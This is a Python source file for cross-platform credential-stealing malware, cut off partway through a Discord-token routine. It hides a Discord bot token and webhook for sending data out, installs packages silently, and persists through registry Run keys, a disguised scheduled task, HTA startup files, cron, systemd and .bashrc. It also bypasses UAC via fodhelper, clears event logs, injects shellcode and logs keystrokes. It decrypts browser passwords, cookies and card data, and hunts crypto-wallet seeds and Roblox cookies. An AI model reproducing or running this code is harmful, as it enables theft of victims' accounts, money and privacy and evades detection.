#!/usr/bin/env python3
import os,sys,subprocess,importlib,time,random,json,base64,sqlite3,shutil,threading,getpass,socket,glob,re,hashlib,tempfile,zlib,io,ctypes,platform,struct,urllib.parse,queue,pickle,binascii,contextlib,locale,uuid
from pathlib import Path
from datetime import datetime

def _1(b,k):
    return bytes([b[i]^k[i%len(k)] for i in range(len(b))])
def _2(e,k):
    return base64.b64decode(_1(base64.b64decode(e),k)).decode()
_tk="TVRRNE56STNOamN4TlRZd05ERXlOVGN6Tncuc0c4V2N3cS1PcDZkTWg0UUhNQVdTZWpUSlVfY0E="
_tk_k=bytes([0xa6,0xa2,0xb7,0xa0,0xb4,0xa5,0xb0,0xbc,0xa7,0xa9,0xa2,0xa5,0xb8,0xa3,0xbc,0xb1,0xb2,0xa5,0xbe,0xa3,0xbc,0xb2,0xa3,0xb6,0xbd,0xa2,0xbe,0xa3,0xb2,0xa3,0xbc])
_wh="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4NzI3NTAxMTgzNTQzMjk5MC95cmdTRTByQmdTMDVDamxzS2FkS1pzbGlzenpBZVlfNFNNbkdkWWVSYTBIcGpWZWdMM0QtN0V5Y0ZQOTFNbkRwSTEtcQ=="
_wh_k=bytes([0xa7,0xa9,0xa2,0xa5,0xb8,0xa3,0xbc,0xb1,0xb2,0xa5,0xbe,0xa3,0xbc,0xb2,0xa3,0xb6,0xbd,0xa2,0xbe,0xa3,0xb2,0xa3,0xbc,0xaf,0xae,0xb9,0xbc,0xb3,0xa5,0xbc,0xa3])
_pfx=_2("Kw==",b'\xff')
_rs=_2("c2FsdA==",b'\x00')
_7=_2(_tk,_tk_k)
_8=_2(_wh,_wh_k)
if os.name=='nt':
    try:import winreg
    except:winreg=None
else:winreg=None
def _9(p):
    for c in [[sys.executable,'-m','pip','install','--user',p],
              [sys.executable,'-m','pip','install',p],
              ['pip','install','--user',p],
              ['pip3','install','--user',p],
              ['pipx','install',p]]:
        try:subprocess.run(c,capture_output=True,timeout=60,check=True);return True
        except:pass
    return False
def _a(n,p=None):
    if p is None:p=n
    try:return importlib.import_module(n)
    except ImportError:
        if _9(p):
            try:return importlib.import_module(n)
            except:pass
    return None
_b=_a('requests')
if not _b:sys.exit(1)
_c=_a('psutil')
_d=_a('pynput')
_e=_a('cv2','opencv-python')
_f=_a('pyaudio')
_g=_a('pyperclip')
_h=_a('keyboard')
_i=None
if platform.system()!='Linux':
    with open(os.devnull,'w') as __:contextlib.redirect_stderr(__)
    _i=_a('pyautogui')
_j=_a('evdev') if platform.system()=='Linux' else None
_k=_a('win32crypt','pywin32') if os.name=='nt' else None
try:from Crypto.Cipher import AES
except:AES=None
try:from Crypto.Protocol.KDF import PBKDF2
except:PBKDF2=None
try:from Crypto.Hash import SHA256,SHA1
except:SHA256=SHA1=None
try:import pygame,pygame.camera
except:pygame=None
_l=True
_m=None
_n=os.getcwd()
_o=False
_p=hashlib.pbkdf2_hmac('sha256',f"{socket.gethostname()}{getpass.getuser()}".encode(),_rs.encode(),100000)
_q=None
_r=None
_s=threading.Event()
_t=False
_u=None
def _v():return False
def _w():return False
def _x():return False
def _y(f):
    if platform.system()=='Windows':
        try:subprocess.run(['attrib','+h',f],capture_output=True,check=False);return f
        except:return f
    else:
        d=os.path.dirname(f);b=os.path.basename(f)
        if not b.startswith('.'):
            n=os.path.join(d,f'.{b}')
            try:os.rename(f,n);return n
            except:return f
        return f
def _z():
    p=os.path.abspath(__file__)
    try:
        if os.path.isfile(p) and os.access(p,os.W_OK):
            s=os.path.getsize(p)
            with open(p,'r+b') as f:
                f.write(b'\x00'*s);f.flush();os.fsync(f.fileno())
        os.remove(p);return True
    except Exception:
        if platform.system()=='Windows':
            try:
                b=tempfile.mktemp(suffix='.bat')
                with open(b,'w',encoding='utf-8') as f:
                    f.write(f'@echo off\nping 127.0.0.1 -n 3 > nul\ndel /F /Q "{p}"\ndel /F /Q "%~f0"\n')
                os.startfile(b);return True
            except:return False
        return False
def _10(h):
    if os.name=='nt':
        if winreg:
            try:
                k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_SET_VALUE)
                winreg.SetValueEx(k,_2("VXBkYXRlQXBw",b'\xaa'),0,winreg.REG_SZ,f"{sys.executable} {h}")
                winreg.CloseKey(k)
            except:pass
        try:
            tn=f"NVIDIA_App_{hashlib.md5(str(time.time()).encode()).hexdigest()[:8]}"
            subprocess.run(['schtasks','/create','/tn',tn,'/tr',f"{sys.executable} {h}",'/sc','daily','/st','09:00','/f'],capture_output=True)
        except:pass
        try:
            hta=f"""<html><head><title>Update</title>
<HTA:APPLICATION ID="SysUpd" APPLICATIONNAME="SysUpd" WINDOWSTATE="minimize" SHOWINTASKBAR="no"/>
<script>new ActiveXObject("WScript.Shell").Run("{sys.executable} {h}",0);self.close();</script>
</head><body></body></html>"""
            hp=Path(os.getenv('APPDATA'))/"Microsoft/Windows/Start Menu/Programs/Startup/SystemUpdate.hta"
            hp.write_text(hta)
        except:pass
        try:
            wmi_cmd=f'powershell -Command "Register-WmiEvent -Query \\"SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName=\'explorer.exe\'\\" -Action {{ Start-Process \\"{sys.executable}\\" -ArgumentList \\"{h}\\" }};"'
            subprocess.run(wmi_cmd,shell=True,capture_output=True)
        except:pass
        try:
            key=r"Software\Classes\ms-settings\shell\open\command"
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER,key) as k:
                winreg.SetValueEx(k,"",0,winreg.REG_SZ,f"{sys.executable} {h}")
                winreg.SetValueEx(k,"DelegateExecute",0,winreg.REG_SZ,"")
            subprocess.Popen("fodhelper.exe",shell=True)
            time.sleep(2)
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER,key)
        except:pass
    else:
        try:
            d=Path.home()/".config/autostart"
            d.mkdir(parents=True,exist_ok=True)
            f=d/"system-helper.desktop"
            f.write_text(f"[Desktop Entry]\nType=Application\nName=System Helper\nExec={sys.executable} {h}\nHidden=true\nNoDisplay=true\nX-GNOME-Autostart-enabled=true\n")
        except:pass
        try:
            cr=f"@reboot {sys.executable} {h} > /dev/null 2>&1\n"
            cur=subprocess.run(['crontab','-l'],capture_output=True,text=True)
            if cr not in cur.stdout:
                subprocess.run(['crontab','-'],input=cur.stdout+cr,text=True,check=True)
        except:pass
        try:
            sd=Path.home()/".config/systemd/user"
            sd.mkdir(parents=True,exist_ok=True)
            sf=sd/"system-helper.service"
            sc=f"""[Unit]
Description=System Helper
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {h}
Restart=always

[Install]
WantedBy=default.target"""
            sf.write_text(sc)
            subprocess.run(['systemctl','--user','daemon-reload'],capture_output=True)
            subprocess.run(['systemctl','--user','enable','system-helper.service'],capture_output=True)
            subprocess.run(['systemctl','--user','start','system-helper.service'],capture_output=True)
        except:pass
        try:
            br=Path.home()/".bashrc"
            with open(br,'a') as f:
                f.write(f"\n# System helper\n{sys.executable} {h} &\n")
        except:pass
def _11():
    if os.name=='nt':
        if winreg:
            try:
                k=winreg.OpenKey(winreg.HKEY_CURRENT_USER,r"Software\Microsoft\Windows\CurrentVersion\Run",0,winreg.KEY_SET_VALUE)
                winreg.DeleteValue(k,_2("VXBkYXRlQXBw",b'\xaa'))
                winreg.CloseKey(k)
            except:pass
        subprocess.run(['schtasks','/delete','/tn','NVIDIA_*','/f'],capture_output=True)
        try:
            (Path(os.getenv('APPDATA'))/"Microsoft/Windows/Start Menu/Programs/Startup/SystemUpdate.hta").unlink(missing_ok=True)
        except:pass
    else:
        subprocess.run(['crontab','-r'],capture_output=True)
        (Path.home()/".config/autostart/system-helper.desktop").unlink(missing_ok=True)
        (Path.home()/".config/systemd/user/system-helper.service").unlink(missing_ok=True)
def _12(f):
    try:
        t=time.time()-random.randint(365*24*3600,730*24*3600)
        os.utime(f,(t,t))
    except:pass
def _13():
    if os.name!='nt':return
    try:
        subprocess.run(['wevtutil','cl','System'],capture_output=True)
        subprocess.run(['wevtutil','cl','Security'],capture_output=True)
        subprocess.run(['wevtutil','cl','Application'],capture_output=True)
    except:pass
def _14():
    try:
        if os.name=='nt':
            import wmi
            c=wmi.WMI()
            cpu=c.Win32_Processor()[0].ProcessorId.strip()
            disk=c.Win32_DiskDrive()[0].SerialNumber.strip() if c.Win32_DiskDrive() else "NODISK"
        else:
            cpu=subprocess.run(['cat','/proc/cpuinfo'],capture_output=True,text=True).stdout
            cpu=hashlib.md5(cpu.encode()).hexdigest()[:16]
            disk=subprocess.run(['lsblk','-o','SERIAL'],capture_output=True,text=True).stdout
            disk=hashlib.md5(disk.encode()).hexdigest()[:16]
        mac=':'.join(re.findall('..','%012x'%uuid.getnode()))[:17]
        return hashlib.md5(f"{cpu}{disk}{mac}".encode()).hexdigest()[:16]
    except:return hashlib.md5(f"{socket.gethostname()}{getpass.getuser()}".encode()).hexdigest()[:16]
def _15():
    if os.name=='nt':
        try:
            u=ctypes.windll.user32
            h=u.GetForegroundWindow()
            l=u.GetWindowTextLengthW(h)
            b=ctypes.create_unicode_buffer(l+1)
            u.GetWindowTextW(h,b,l+1)
            return b.value
        except:return ""
    else:
        try:
            w=subprocess.run(['wmctrl','-l'],capture_output=True,text=True)
            for l in w.stdout.splitlines():
                if '(active)' in l:
                    return l.split('  ',2)[-1]
        except:pass
        return ""
def _16():
    if os.name!='nt':return ""
    try:
        import wmi
        c=wmi.WMI()
        i={}
        for cp in c.Win32_ComputerSystem():
            i['manufacturer']=cp.Manufacturer
            i['model']=cp.Model
        for p in c.Win32_Processor():
            i['cpu']=p.Name
        for d in c.Win32_DiskDrive():
            i['disk']=d.Model
        for m in c.Win32_PhysicalMemory():
            i['ram_gb']=round(int(m.Capacity)/(1024**3),2)
        return json.dumps(i)
    except:return ""
def _17():
    c=[]
    if _e:
        for i in range(5):
            cap=_e.VideoCapture(i)
            if cap.isOpened():
                c.append(i)
                cap.release()
    return c
def _18():
    if not _e:return {}
    c=_17()
    r={}
    for i in c:
        cap=_e.VideoCapture(i)
        if cap.isOpened():
            ret,f=cap.read()
            cap.release()
            if ret:
                _,b=_e.imencode('.jpg',f)
                r[i]=b.tobytes()
    return r
def _19(d=10,o=None):
    if not _e or not _i:return None
    if o is None:o=Path(tempfile.gettempdir())/f"rec_{int(time.time())}.mp4"
    try:
        fcc=_e.VideoWriter_fourcc(*'mp4v')
        out=None
        st=time.time()
        while time.time()-st<d:
            img=_i.screenshot()
            fr=_e.cvtColor(np.array(img),_e.COLOR_RGB2BGR)
            if out is None:
                h,w,_=fr.shape
                out=_e.VideoWriter(str(o),fcc,10.0,(w,h))
            out.write(fr)
            time.sleep(0.1)
        if out:out.release()
        return o.read_bytes() if o.exists() else None
    except:return None
def _20(pid,sc):
    if os.name!='nt':return False
    try:
        k=ctypes.windll.kernel32
        h=k.OpenProcess(0x1F0FFF,False,pid)
        if not h:return False
        a=k.VirtualAllocEx(h,0,len(sc),0x1000,0x40)
        if not a:return False
        w=ctypes.c_size_t()
        k.WriteProcessMemory(h,a,sc,len(sc),ctypes.byref(w))
        k.CreateRemoteThread(h,0,0,a,0,0,0)
        return True
    except:return False
def _21(pid,sc):
    if os.name!='nt':return False
    try:
        k=ctypes.windll.kernel32
        h=k.OpenProcess(0x1F0FFF,False,pid)
        if not h:return False
        a=k.VirtualAllocEx(h,0,len(sc),0x1000,0x40)
        if not a:return False
        w=ctypes.c_size_t()
        k.WriteProcessMemory(h,a,sc,len(sc),ctypes.byref(w))
        k.QueueUserAPC(a,h,0)
        return True
    except:return False
class _22:
    def __init__(self):
        self.l=[]
        self.r=False
        self.t=None
        self.m='pynput' if _d else ('evdev' if _j else ('keyboard' if _h else None))
        self.lw=""
    def start(self):
        if self.r or not self.m:return
        self.r=True
        self.t=threading.Thread(target=self._run,daemon=True)
        self.t.start()
    def stop(self):
        self.r=False
        if self.t:self.t.join(1)
    def dump(self):
        d=''.join(self.l)
        self.l.clear()
        return d
    def _run(self):
        if self.m=='pynput':
            try:
                from pynput import keyboard
                def on_press(k):
                    if not self.r:return False
                    w=_15()
                    if w!=self.lw:
                        self.lw=w
                        self.l.append(f"\n[{w}]\n")
                    try:
                        if hasattr(k,'char') and k.char:self.l.append(k.char)
                        else:self.l.append(f'[{k}]')
                    except:self.l.append('[?]')
                with keyboard.Listener(on_press=on_press) as l:
                    while self.r:time.sleep(0.1)
                    l.stop()
            except:pass
        elif self.m=='evdev':
            try:
                from evdev import InputDevice,ecodes
                devs=[InputDevice(p) for p in evdev.list_devices()]
                kb=next((d for d in devs if 'keyboard' in d.name.lower()),devs[0] if devs else None)
                if kb:
                    for e in kb.read_loop():
                        if not self.r:break
                        if e.type==ecodes.EV_KEY:
                            key=evdev.categorize(e)
                            if key.keystate==1:
                                w=_15()
                                if w!=self.lw:
                                    self.lw=w
                                    self.l.append(f"\n[{w}]\n")
                                self.l.append(f'[{key.keycode}]')
            except:pass
        elif self.m=='keyboard':
            try:
                import keyboard
                def on_press(e):
                    if not self.r:return
                    w=_15()
                    if w!=self.lw:
                        self.lw=w
                        self.l.append(f"\n[{w}]\n")
                    self.l.append(e.name)
                keyboard.on_press(on_press)
                while self.r:time.sleep(0.1)
            except:pass
def _23(bp):
    ls=bp/"Local State"
    if not ls.exists():return None
    try:
        with open(ls,'r') as f:d=json.load(f)
        ek=base64.b64decode(d['os_crypt']['encrypted_key'])
        if ek[:5]==b'DPAPI':ek=ek[5:]
        if _k:return _k.CryptUnprotectData(ek,None,None,None,0)[1]
        return ek
    except:return None
def _24(ev,k):
    if not k or not AES:return None
    try:
        if ev[:3]==b'v10' or ev[:3]==b'v20':ev=ev[3:]
        n=ev[3:15];ct=ev[15:-16];t=ev[-16:]
        c=AES.new(k,AES.MODE_GCM,nonce=n)
        c.update(b'v10')
        return c.decrypt_and_verify(ct,t).decode('utf-8')
    except:return None
def _25(p):
    pr=[]
    d=p/"Default"
    if d.exists():pr.append(("Default",d))
    for i in p.glob("Profile *"):
        if i.is_dir():pr.append((i.name,i))
    return pr
def _26(pp):
    if not PBKDF2 or not AES:return None
    k4=pp/"key4.db"
    if not k4.exists():return None
    try:
        t=Path(tempfile.gettempdir())/"key4.db"
        shutil.copy2(k4,t)
        c=sqlite3.connect(t)
        cur=c.cursor()
        cur.execute("SELECT item1,item2 FROM metadata WHERE id='password'")
        r=cur.fetchone()
        if not r:return None
        gs=r[0]
        cur.execute("SELECT a11,a102 FROM nssPrivate")
        r=cur.fetchone()
        if not r:return None
        a11,a102=r
        c.close();t.unlink()
        k=PBKDF2(gs,a11,dkLen=32,count=10000,hmac_hash_module=SHA256)
        iv=a102[:16];enc=a102[16:]
        ci=AES.new(k,AES.MODE_CBC,iv)
        mk=ci.decrypt(enc)
        pl=mk[-1]
        return mk[:-pl]
    except:return None
def _27(ed,mk):
    if not mk or not AES:return None
    try:
        d=base64.b64decode(ed)
        iv=d[:16];ct=d[16:]
        ci=AES.new(mk,AES.MODE_CBC,iv)
        dec=ci.decrypt(ct)
        pl=dec[-1]
        return dec[:-pl].decode('utf-8')
    except:return None
def _28():
    if os.name=='nt':
        pp=Path(os.getenv('APPDATA'))/"Mozilla/Firefox/Profiles"
    else:
        pp=Path.home()/".mozilla/firefox"
    if not pp.exists():return []
    return list(pp.glob("*.default*"))
def _29():
    d={}
    if os.name=='nt':
        l=os.getenv('LOCALAPPDATA')
        b=[
            ("chrome",Path(l)/"Google/Chrome/User Data"),
            ("edge",Path(l)/"Microsoft/Edge/User Data"),
            ("brave",Path(l)/"BraveSoftware/Brave-Browser/User Data"),
            ("opera",Path(l)/"Opera Software/Opera Stable"),
            ("vivaldi",Path(l)/"Vivaldi/User Data")
        ]
    else:
        h=Path.home()
        b=[
            ("chrome",h/".config/google-chrome"),
            ("brave",h/".config/BraveSoftware/Brave-Browser"),
            ("chromium",h/".config/chromium")
        ]
    for n,p in b:
        if not p.exists():continue
        k=_23(p)
        if not k:continue
        for pn,pp in _25(p):
            db=pp/"Login Data"
            if not db.exists():continue
            try:
                t=Path(tempfile.gettempdir())/f"{n}_{pn}_logins.db"
                shutil.copy2(db,t)
                c=sqlite3.connect(t)
                cur=c.cursor()
                cur.execute("SELECT origin_url,username_value,password_value FROM logins")
                for r in cur.fetchall():
                    if r[2]:
                        pwd=_24(r[2],k)
                        if pwd:
                            d.setdefault(n,{}).setdefault(pn,[]).append({'url':r[0],'username':r[1],'password':pwd})
                c.close();t.unlink()
            except:pass
    for p in _28():
        mk=_26(p)
        if not mk:continue
        lf=p/"logins.json"
        if not lf.exists():continue
        try:
            with open(lf,'r') as f:
                lg=json.load(f)
            for e in lg.get("logins",[]):
                u=_27(e['encryptedUsername'],mk)
                pw=_27(e['encryptedPassword'],mk)
                if u and pw:
                    d.setdefault('firefox',{}).setdefault(p.name,[]).append({'url':e.get('hostname'),'username':u,'password':pw})
        except:pass
    return json.dumps(d)
def _30():
    d={}
    if os.name=='nt':
        l=os.getenv('LOCALAPPDATA')
        b=[
            ("chrome",Path(l)/"Google/Chrome/User Data"),
            ("edge",Path(l)/"Microsoft/Edge/User Data"),
            ("brave",Path(l)/"BraveSoftware/Brave-Browser/User Data")
        ]
    else:
        h=Path.home()
        b=[
            ("chrome",h/".config/google-chrome"),
            ("brave",h/".config/BraveSoftware/Brave-Browser")
        ]
    for n,p in b:
        if not p.exists():continue
        k=_23(p)
        if not k:continue
        for pn,pp in _25(p):
            db=pp/"Cookies"
            if not db.exists():continue
            try:
                t=Path(tempfile.gettempdir())/f"{n}_{pn}_cookies.db"
                shutil.copy2(db,t)
                c=sqlite3.connect(t)
                cur=c.cursor()
                cur.execute("SELECT host_key,name,encrypted_value FROM cookies LIMIT 100")
                cs=[]
                for r in cur.fetchall():
                    if r[2]:
                        v=_24(r[2],k)
                        if v:
                            cs.append({'host':r[0],'name':r[1],'value':v[:100]})
                c.close();t.unlink()
                if cs:d.setdefault(n,{})[pn]=cs
            except:pass
    for p in _28():
        cd=p/"cookies.sqlite"
        if not cd.exists():continue
        try:
            t=Path(tempfile.gettempdir())/"cookies.db"
            shutil.copy2(cd,t)
            c=sqlite3.connect(t)
            cur=c.cursor()
            cur.execute("SELECT host,name,value FROM moz_cookies LIMIT 100")
            cs=[]
            for r in cur.fetchall():
                cs.append({'host':r[0],'name':r[1],'value':r[2][:100]})
            c.close();t.unlink()
            if cs:d.setdefault('firefox',{})[p.name]=cs
        except:pass
    return json.dumps(d)
def _31():
    d={}
    if os.name=='nt':
        l=os.getenv('LOCALAPPDATA')
        b=[
            ("chrome",Path(l)/"Google/Chrome/User Data"),
            ("edge",Path(l)/"Microsoft/Edge/User Data"),
            ("brave",Path(l)/"BraveSoftware/Brave-Browser/User Data")
        ]
    else:
        h=Path.home()
        b=[
            ("chrome",h/".config/google-chrome"),
            ("brave",h/".config/BraveSoftware/Brave-Browser")
        ]
    for n,p in b:
        if not p.exists():continue
        k=_23(p)
        if not k:continue
        for pn,pp in _25(p):
            db=pp/"Web Data"
            if not db.exists():continue
            try:
                t=Path(tempfile.gettempdir())/f"{n}_{pn}_cards.db"
                shutil.copy2(db,t)
                c=sqlite3.connect(t)
                cur=c.cursor()
                cur.execute("SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards LIMIT 20")
                cs=[]
                for r in cur.fetchall():
                    if r[3]:
                        num=_24(r[3],k)
                        if num:
                            m="****"+num[-4:] if len(num)>4 else num
                            cs.append({'name':r[0],'exp_month':r[1],'exp_year':r[2],'number':m})
                c.close();t.unlink()
                if cs:d.setdefault(n,{})[pn]=cs
            except:pass
    return json.dumps(d)
def _32():
    d={}
    if os.name=='nt':
        l=os.getenv('LOCALAPPDATA')
        b=[
            ("chrome",Path(l)/"Google/Chrome/User Data"),
            ("edge",Path(l)/"Microsoft/Edge/User Data"),
            ("brave",Path(l)/"BraveSoftware/Brave-Browser/User Data")
        ]
    else:
        h=Path.home()
        b=[
            ("chrome",h/".config/google-chrome"),
            ("brave",h/".config/BraveSoftware/Brave-Browser")
        ]
    for n,p in b:
        if not p.exists():continue
        for pn,pp in _25(p):
            db=pp/"History"
            if not db.exists():continue
            try:
                t=Path(tempfile.gettempdir())/f"{n}_{pn}_history.db"
                shutil.copy2(db,t)
                c=sqlite3.connect(t)
                cur=c.cursor()
                cur.execute("SELECT url,title,visit_count,last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
                rs=cur.fetchall()
                if rs:
                    d.setdefault(n,{}).setdefault(pn,[]).extend([{'url':r[0],'title':r[1],'visits':r[2],'time':r[3]} for r in rs])
                c.close();t.unlink()
            except:pass
    for p in _28():
        pl=p/"places.sqlite"
        if not pl.exists():continue
        try:
            t=Path(tempfile.gettempdir())/"places.db"
            shutil.copy2(pl,t)
            c=sqlite3.connect(t)
            cur=c.cursor()
            cur.execute("SELECT url,title,visit_count,last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 100")
            rs=cur.fetchall()
            if rs:
                d.setdefault('firefox',{}).setdefault(p.name,[]).extend([{'url':r[0],'title':r[1],'visits':r[2],'time':r[3]} for r in rs])
            c.close();t.unlink()
        except:pass
    return json.dumps(d)
def _33():
    d={}
    if os.name=='nt':
        l=os.getenv('LOCALAPPDATA')
        b=[
            ("chrome",Path(l)/"Google/Chrome/User Data"),
            ("edge",Path(l)/"Microsoft/Edge/User Data"),
            ("brave",Path(l)/"BraveSoftware/Brave-Browser/User Data")
        ]
    else:
        h=Path.home()
        b=[
            ("chrome",h/".config/google-chrome"),
            ("brave",h/".config/BraveSoftware/Brave-Browser")
        ]
    for n,p in b:
        if not p.exists():continue
        for pn,pp in _25(p):
            bm=pp/"Bookmarks"
            if bm.exists():
                try:
                    with open(bm,'r',encoding='utf-8') as f:
                        bmj=json.load(f)
                    rts=bmj.get('roots',{})
                    d.setdefault(n,{}).setdefault(pn,{})
                    for rn,rd in rts.items():
                        if isinstance(rd,dict):
                            ch=rd.get('children',[])
                            d[n][pn][rn]=f"{len(ch)} items"
                except:pass
    for p in _28():
        pl=p/"places.sqlite"
        if not pl.exists():continue
        try:
            t=Path(tempfile.gettempdir())/"places.db"
            shutil.copy2(pl,t)
            c=sqlite3.connect(t)
            cur=c.cursor()
            cur.execute("SELECT title,url FROM moz_bookmarks b JOIN moz_places p ON b.fk=p.id")
            bm=[]
            for r in cur.fetchall():
                bm.append({'title':r[0],'url':r[1]})
            c.close();t.unlink()
            if bm:d.setdefault('firefox',{})[p.name]=bm[:50]
        except:pass
    return json.dumps(d)
def _34():
    d={}
    if os.name=='nt':
        l=os.getenv('LOCALAPPDATA')
        b=[
            ("chrome",Path(l)/"Google/Chrome/User Data"),
            ("edge",Path(l)/"Microsoft/Edge/User Data"),
            ("brave",Path(l)/"BraveSoftware/Brave-Browser/User Data")
        ]
    else:
        h=Path.home()
        b=[
            ("chrome",h/".config/google-chrome"),
            ("brave",h/".config/BraveSoftware/Brave-Browser")
        ]
    for n,p in b:
        if not p.exists():continue
        for pn,pp in _25(p):
            db=pp/"History"
            if not db.exists():continue
            try:
                t=Path(tempfile.gettempdir())/f"{n}_{pn}_downloads.db"
                shutil.copy2(db,t)
                c=sqlite3.connect(t)
                cur=c.cursor()
                cur.execute("SELECT target_path,url,start_time,end_time FROM downloads")
                rs=cur.fetchall()
                if rs:
                    d.setdefault(n,{}).setdefault(pn,[]).extend([{'path':r[0],'url':r[1],'start':r[2],'end':r[3]} for r in rs])
                c.close();t.unlink()
            except:pass
    return json.dumps(d)
def _35():
    c=[]
    if os.name=='nt':
        l=os.getenv('LOCALAPPDATA')
        b=[Path(l)/"Google/Chrome/User Data",Path(l)/"BraveSoftware/Brave-Browser/User Data",Path(l)/"Microsoft/Edge/User Data"]
    else:
        h=Path.home()
        b=[h/".config/google-chrome",h/".config/BraveSoftware/Brave-Browser"]
    for p in b:
        if not p.exists():continue
        k=_23(p)
        if not k:continue
        for pn,pp in _25(p):
            db=pp/"Cookies"
            if not db.exists():continue
            try:
                t=Path(tempfile.gettempdir())/"roblox_cookies.db"
                shutil.copy2(db,t)
                c2=sqlite3.connect(t)
                cur=c2.cursor()
                cur.execute("SELECT host_key,name,encrypted_value FROM cookies WHERE host_key='.roblox.com' AND name='.ROBLOSECURITY'")
                for r in cur.fetchall():
                    if r[2]:
                        v=_24(r[2],k)
                        if v:c.append(v)
                c2.close();t.unlink()
            except:pass
    return c
def _36():
    d={}
    if os.name=='nt':
        a=os.getenv('APPDATA');l=os.getenv('LOCALAPPDATA')
        ds=[("exodus",Path(a)/"Exodus"),("electrum",Path(a)/"Electrum"),("atomic",Path(a)/"Atomic"),("guarda",Path(a)/"Guarda"),("coinomi",Path(a)/"Coinomi"),("jaxx",Path(a)/"Jaxx")]
        for n,p in ds:
            if p.exists():
                try:
                    d[n]=[]
                    for f in p.rglob("*"):
                        if f.is_file() and f.stat().st_size<100000:
                            cnt=f.read_text(errors='ignore')[:500]
                            if any(k in cnt.lower() for k in ['seed','mnemonic','private','phrase']):
                                d[n].append(f.name)
                except:pass
        exts=[
            "nkbihfbeogaeaoehlefnkodbefgpgknn","bfnaelmomeimhlpmgjnjphhpkkoljpa","egjidjbpglichkbfhlakidmjoabbbbb","hnfanknocfeofbddgcijnmhnfnkdnaad","fhbohimaelbohpjbbldcngcnapndodjp","dmkamcknogkgcdfhhbddcghachkejeap","odbfpeeihdkbihmbbkbmgcablfjaagbh","ejjladinnckdgjemekebdpeokbikhfci","hpglfhgfnhbgjdenlgpjoefjioekpboe","jblndlipeogpafnldhgmapagccbchcho","mcohilncbfahbmgdjkbpemcciokgcoka","kncchdigobghenbbaddojjnnaogfppfj","bocpokimicclpaiekenaeelehdjllofo","fngmhnnpilhplaeedifhccceomclgfbg","nlbmnnijcnlegkjjpcfjclmcfggfefdm","ednmfgcndmhehioohgmihkjcjbfgpgop","pfnfomfmcjbdmndbcbgdlnhfkfhfggif","bbilcmphhbdngfmnpikpnbfdlmbmmkkg","onfhmhnfejmmibogdohkbgnpgpppkjja","jfcddpkfofmfepgmdanmffdbdbjfmefm","hmbdxjbeaikaijcgjlfncaklmeggeboe","aodkkagnadcbahhgdfmcjmnfilmdlikk","jpfpebmajppdmpfplpakcmlkjnepkmhm","lbfehkoinhhcknnnagnaghfkeajglfoc","fheflkdnponkjjdplibpkgkgjchfcjcf","gdadiaofnhkhdcihhamlkbhldoajfhop","njpknlbnohgjfhcdcppacfmgfgmopkdi","abamkkkegknihihicfhpelbjfhkmebfg","ihejagjnncglplbpbnigklncdbdhlfpl","cjfifjojmhgfnmaggakdcoiabihmngoe","fnjhmkhhmkbjkkabndcnnogagogbneec","ecopmaagpahfpgkhgghbkidhnakgfmop","fbcoabjmfgmihjkkcjfblkdmimjbfeik","ipfphmpkfegnnkkpkggbnjohhkjhkdka","cfkkpmdcijllbdadlilojgijjjbmljih","ehkjiabhkbmbohpjcfcchpffdlkkhbee","dopncmgmafmbpjhfbglbkckmlekddejl","aejjeolkkmlmmopjdjbfinpfkpbcdckc","hccfjnnkdfphlbgcphigipjabjnnmepl","gbmhjpghmhemdodpgejcncnepebgljlj","bmeaphmmakleohjknefdhmbnopfonlif","eclkdakfofjagcgblanjdpcfcegcheie","pcopjbdihmpjdciheejoknjdbfcbnnok","lbfgakkdmhkmnmiccjhffpldnlijgclg","nkjdfenhelilcbcojficdnajblnchfea","ohhgdlfheikgdchnkekfjgmmfkfjbckd","clfheclbgkcnncnchokjmcfpddgdmgii","kegphmkgkmbkmjcnpjpajhponafggbkp","cdffhcdggmgaknjnhflmipibknmigdkm","nniknehbajjecgkppgfckgnklmmdlflc","hhejbopkndapdmlklcjolbhlgfhfpjbl","cimiefiiaegbelhefglklhhakdjnnblp","acmacodkjbdgmolekbjignmnlgebpkad","ahfgeipfpmhnbdmlkcbfcbeohpkmdffd","pocmamikbdodmhgcnlflhppifngmilpo","ngpampappnmepgilojfohadhhmbhlaek","bifpijpmjclggjmhkaaapmgnpfahiloo","hfnkpimlhhgieaddgfemjhofmfekaibc","ldnbfmoeflkkbmpjakmjicjnhbhnhhjp","ifbcbgmhknpokigepdbmcncffmelfjmg","kdnhgppnnjefiomfimjlnkbfjpmmokgd","dpclmkljdcjmlkhloiihkfhihbdcmbjh","nnhffkplcdcoobmhhpdkglagjhakjjbj","jgnlhhefnnppbmmjgfajagmkmfajgldh","njddlhnmflppabibgocbkjddfgipbafk","fpaknfdnagaacpgdmbjkdokgjnjclgid","pkgfbdacpnddbnmgofogjapdlaoijmfi","dngmlblcodfobpdpecaadmfbcbcfjlep","ajopnjhbhgpdhfhpmlagcfkdliabldjk","naepdomgkenhinolocfifgehidddafdn","khgkcdifgpgokjlecmkmojbnleohbhph","ammjpmcpphnoiokahbokijimhcgpncml"
        ]
        for e in exts:
            p=Path(l)/f"Google/Chrome/User Data/Default/Local Extension Settings/{e}"
            if p.exists():d.setdefault(e[:10],[]).append(str(p))
    else:
        h=Path.home()
        ds=[("exodus",h/".exodus"),("electrum",h/".electrum"),("atomic",h/".atomic"),("guarda",h/".guarda"),("coinomi",h/".coinomi"),("jaxx",h/".jaxx")]
        for n,p in ds:
            if p.exists():
                try:
                    d[n]=[]
                    for f in p.rglob("*"):
                        if f.is_file() and f.stat().st_size<100000:
                            cnt=f.read_text(errors='ignore')[:500]
                            if any(k in cnt.lower() for k in ['seed','mnemonic','private','phrase']):
                                d[n].append(f.name)
                except:pass
    return json.dumps(d)
def _37():
    t=[]
    if os.name=='nt':
        a=os.getenv('APPDATA')
        p=[Path(a)/"discord/Local Storage/leveldb",Path(a)/"discordcanary/Local Storage/leveldb",Path(a)/"discordptb/Local Storage/leveldb"]
        l=os.getenv('LOCALAPPDATA')
